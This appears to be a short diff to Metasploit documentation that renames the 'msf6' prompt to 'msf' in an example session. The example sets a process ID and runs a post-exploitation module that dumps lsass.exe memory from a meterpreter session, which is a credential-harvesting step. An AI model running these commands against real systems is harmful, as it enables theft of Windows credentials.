@@ -78,9 +78,9 @@ Process List
 
 meterpreter > 
 Background session 4? [y/N]  
-msf6 post(windows/gather/memory_dump) > set pid 700
+msf post(windows/gather/memory_dump) > set pid 700
 pid => 700
-msf6 post(windows/gather/memory_dump) > run
+msf post(windows/gather/memory_dump) > run
 
 [*] Running module against DemoPC
 [*] Dumping memory for lsass.exe
